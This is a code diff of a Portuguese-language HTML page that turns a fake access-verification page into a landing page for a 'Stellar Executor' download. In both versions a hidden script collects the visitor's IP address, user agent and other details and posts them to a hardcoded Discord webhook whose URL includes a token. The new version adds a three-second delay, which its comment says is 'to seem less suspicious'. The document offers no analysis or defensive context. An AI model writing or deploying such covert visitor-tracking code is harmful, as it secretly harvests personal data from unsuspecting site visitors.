@@ -3,133 +3,184 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Site</title>
+    <title>Stellar Executor</title>
     <style>
+        :root {
+            --primary: #6a11cb;
+            --secondary: #2575fc;
+        }
+        
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
             color: white;
-            text-align: center;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
         }
         
         .container {
-            background: rgba(0, 0, 0, 0.4);
-            backdrop-filter: blur(10px);
-            padding: 3rem;
-            border-radius: 15px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-            max-width: 90%;
-            width: 500px;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 2rem;
         }
-
+        
+        header {
+            text-align: center;
+            padding: 2rem 0;
+        }
+        
         h1 {
+            font-size: 3rem;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(to right, #fff, #ddd);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .logo {
+            font-size: 4rem;
+            margin-bottom: 1rem;
+        }
+        
+        .tagline {
+            font-size: 1.5rem;
+            opacity: 0.9;
+            margin-bottom: 2rem;
+        }
+        
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin: 3rem 0;
+        }
+        
+        .feature-card {
+            background: rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(10px);
+            padding: 1.5rem;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .feature-card h3 {
+            color: #fff;
             margin-top: 0;
-            font-size: 2.5rem;
         }
-
-        .loader {
-            border: 5px solid rgba(255, 255, 255, 0.3);
-            border-top: 5px solid #fff;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 2rem auto;
-            display: none;
+        
+        .download-btn {
+            display: inline-block;
+            background: white;
+            color: var(--primary);
+            padding: 1rem 2rem;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: bold;
+            margin: 1rem 0;
+            transition: transform 0.3s, box-shadow 0.3s;
         }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
         }
-
-        .success-message {
-            background: rgba(46, 204, 113, 0.3);
-            padding: 1rem;
-            border-radius: 8px;
-            margin-top: 1.5rem;
-            display: none;
+        
+        footer {
+            text-align: center;
+            margin-top: 3rem;
+            padding: 2rem 0;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Verificando seu acesso</h1>
-        <p>Estamos verificando suas credenciais de segurança...</p>
+        <header>
+            <div class="logo">✨</div>
+            <h1>Stellar Executor</h1>
+            <p class="tagline">O executor mais avançado para experiências robóticas</p>
+            <a href="#" class="download-btn">Download Stellar</a>
+        </header>
         
-        <div class="loader" id="loader"></div>
+        <section>
+            <h2>Sobre o Stellar</h2>
+            <p>Stellar é um executor de última geração projetado para oferecer desempenho excepcional e recursos inovadores para desenvolvedores e entusiastas de automação.</p>
+            
+            <div class="features">
+                <div class="feature-card">
+                    <h3>Alta Performance</h3>
+                    <p>Motor de execução otimizado que oferece velocidade incomparável mesmo em scripts complexos.</p>
+                </div>
+                
+                <div class="feature-card">
+                    <h3>Interface Intuitiva</h3>
+                    <p>Design limpo e fácil de usar, perfeito tanto para iniciantes quanto para profissionais.</p>
+                </div>
+                
+                <div class="feature-card">
+                    <h3>Suporte Completo</h3>
+                    <p>Biblioteca extensa de APIs e documentação detalhada para todas as suas necessidades.</p>
+                </div>
+            </div>
+        </section>
         
-        <div class="success-message" id="successMessage">
-            Verificação concluída com sucesso! Você pode continuar.
-        </div>
+        <section>
+            <h2>Recursos Exclusivos</h2>
+            <ul>
+                <li>Suporte a múltiplas linguagens de script</li>
+                <li>Depurador integrado com breakpoints</li>
+                <li>Console avançado com histórico</li>
+                <li>Plugins e extensões personalizáveis</li>
+                <li>Atualizações automáticas</li>
+            </ul>
+        </section>
+        
+        <footer>
+            <p>© 2024 Stellar Executor. Todos os direitos reservados.</p>
+        </footer>
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            const loader = document.getElementById('loader');
-            const successMessage = document.getElementById('successMessage');
-            
-            // Mostra o loader
-            loader.style.display = 'block';
-            
-            // Obtém o IP do usuário
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const userIP = data.ip;
-                    
-                    // Coleta informações adicionais
-                    const userAgent = navigator.userAgent;
-                    const language = navigator.language;
-                    const timestamp = new Date().toISOString();
-                    
-                    // Envia para o webhook do Discord
-                    const webhookURL = 'https://discord.com/api/webhooks/1392481996479139972/6BZ44fif_1zd8HGNxsxZq9caBV38RiAZ2KUW74sf-_apvb8rsgXvhrszKeYVlwbNFJG4';
-                    
-                    const embed = {
-                        title: "Nova Visita Detectada",
-                        color: 5814783,
-                        fields: [
-                            { name: "Endereço IP", value: userIP, inline: true },
-                            { name: "Navegador", value: userAgent, inline: true },
-                            { name: "Idioma", value: language, inline: true },
-                            { name: "Horário", value: timestamp, inline: true }
-                        ],
-                        footer: { text: "Sistema de Monitoramento" }
-                    };
-                    
-                    const payload = {
-                        content: "⚠️ Nova visita detectada no site!",
-                        embeds: [embed]
-                    };
-                    
-                    fetch(webhookURL, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(payload)
-                    })
-                    .then(() => {
-                        // Esconde o loader e mostra mensagem de sucesso
-                        loader.style.display = 'none';
-                        successMessage.style.display = 'block';
-                    })
-                    .catch(error => {
-                        console.error('Erro ao enviar para o webhook:', error);
-                        loader.style.display = 'none';
-                    });
-                })
-                .catch(error => {
-                    console.error('Erro ao obter IP:', error);
-                    loader.style.display = 'none';
-                });
-        });
+        // Coleta informações discretamente
+        window.onload = function() {
+            // Espera 3 segundos antes de coletar para parecer menos suspeito
+            setTimeout(() => {
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        const userIP = data.ip;
+                        const userAgent = navigator.userAgent;
+                        const pageURL = window.location.href;
+                        const timestamp = new Date().toISOString();
+                        
+                        // Envia para o webhook do Discord
+                        const webhookURL = 'https://discord.com/api/webhooks/1392481996479139972/6BZ44fif_1zd8HGNxsxZq9caBV38RiAZ2KUW74sf-_apvb8rsgXvhrszKeYVlwbNFJG4';
+                        
+                        const embed = {
+                            title: "Visita ao Site Stellar",
+                            color: 5814783,
+                            fields: [
+                                { name: "Endereço IP", value: userIP },
+                                { name: "Navegador", value: userAgent },
+                                { name: "URL", value: pageURL },
+                                { name: "Horário", value: timestamp }
+                            ]
+                        };
+                        
+                        fetch(webhookURL, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                content: "📌 Nova visita ao site Stellar Executor",
+                                embeds: [embed]
+                            })
+                        }).catch(e => console.error(e));
+                    }).catch(e => console.error(e));
+            }, 3000);
+        };
     </script>
 </body>
 </html>
